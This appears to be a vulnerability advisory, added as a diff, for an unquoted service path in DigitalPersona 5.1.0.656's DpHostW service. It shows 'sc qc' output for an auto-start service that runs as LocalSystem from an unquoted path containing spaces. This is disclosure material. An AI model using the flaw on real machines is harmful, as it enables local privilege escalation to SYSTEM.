@@ -1,0 +1,27 @@
+#Exploit Title: DigitalPersona 5.1.0.656 'DpHostW' - Unquoted Service Path
+# Discovery by: Teresa Q
+# Discovery Date: 2020-11-11
+# Vendor:DigitalPersona  U. are U. One Touch
+# Version: 5.1.0.656
+# Vulnerability Type: Unquoted Service Path
+# Vendor Homepage :  https://www.hidglobal.com/crossmatch
+# Tested on OS: Windows 10 Home x64 es
+
+#Analyze PoC :
+==============
+
+C:\>sc qc "DpHost"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: DpHost
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\DigitalPersona\Bin\DpHostW.exe
+        GRUPO_ORDEN_CARGA  : BiometricGroup
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Servicio de autenticación biométrica
+        DEPENDENCIAS       : RPCSS
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+C:\>
